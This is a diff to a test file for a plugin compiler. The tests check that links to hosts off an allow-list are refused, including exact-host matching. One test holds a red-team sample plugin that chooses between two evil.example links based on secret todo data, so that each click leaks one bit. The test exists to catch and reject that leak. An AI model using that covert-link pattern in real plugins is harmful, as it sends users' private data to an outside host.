@@ -333,17 +333,42 @@ describe("elements", () => {
     ["popover", `<div popover="auto" />`, "thx/attribute"],
     ["target", `<a href="https://example.com" target="_self">x</a>`, "thx/attribute"],
     ["link credentials", `<a href="https://user:pw@example.com">x</a>`, "thx/address"],
+    ["outside link host", `<a href="https://evil.example/bit1">x</a>`, "thx/address"],
+    ["http link to an outside host", `<a href="http://evil.example/">x</a>`, "thx/address"],
   ];
   for (const [name, jsx, code] of cases) test(name, () => refused(element(jsx), code));
 
   test("a link written out opens in a new tab with noopener noreferrer, and is in the manifest", async () => {
-    const r = compile({ "plugin.thx": element(`<a href="https://docs.example.com/help">Help</a>`) }, todoEnv());
+    const r = compile({ "plugin.thx": element(`<a href="https://docs.example.com/help">Help</a>`) }, todoEnv({ linkHosts: ["docs.example.com"] }));
     assert.ok(r.ok);
     if (!r.ok) return;
     assert.deepEqual(r.manifest.addresses, ["https://docs.example.com/help"]);
     const app = await fakeApp(r.code);
     const [a] = app.render() as { type: string; props: Record<string, unknown> }[];
     assert.deepEqual([a.type, a.props.href, a.props.target, a.props.rel], ["a", "https://docs.example.com/help", "_blank", "noopener noreferrer"]);
+  });
+  test("a link chosen by secret data among fixed outside addresses is refused", () => {
+    // redteam-exfil round 1: one anchor over N fixed literals on the attacker's host leaked log2(N) bits a click.
+    const src = `${PRE}export default definePlugin(main, { name: "x" }, function X() {
+  const q = useQuery(listTodos);
+  const secret = q.data && q.data[0] ? q.data[0].done : false;
+  return secret ? <a href="https://evil.example/bit1">o</a> : <a href="https://evil.example/bit0">o</a>;
+});
+`;
+    const r = compile({ "plugin.thx": src }, todoEnv());
+    assert.equal(r.ok, false);
+    if (!r.ok) {
+      assert.deepEqual([...new Set(r.errors.map((e) => e.code))], ["thx/address"]);
+      assert.match(r.errors[0].message, /evil\.example` is not one of the hosts the app lets plugins link to/);
+    }
+  });
+  test("link hosts and load hosts are separate lists", () => {
+    refused(element(`<a href="https://cdn.example.com/x">x</a>`), "thx/address", todoEnv({ addressHosts: ["cdn.example.com"] }));
+    refused(element(`<img src="https://docs.example.com/x.png" alt="" />`), "thx/address", todoEnv({ linkHosts: ["docs.example.com"] }));
+  });
+  test("a link host matches the host exactly, not a suffix", () => {
+    refused(element(`<a href="https://docs.example.com.evil.example/">x</a>`), "thx/address", todoEnv({ linkHosts: ["docs.example.com"] }));
+    refused(element(`<a href="https://evil.docs.example.com/">x</a>`), "thx/address", todoEnv({ linkHosts: ["docs.example.com"] }));
   });
   test("an image from an allowed host compiles and is listed", () => {
     const r = compile({ "plugin.thx": element(`<img src="https://cdn.example.com/logo.png" alt="" />`) }, todoEnv({ addressHosts: ["cdn.example.com"] }));
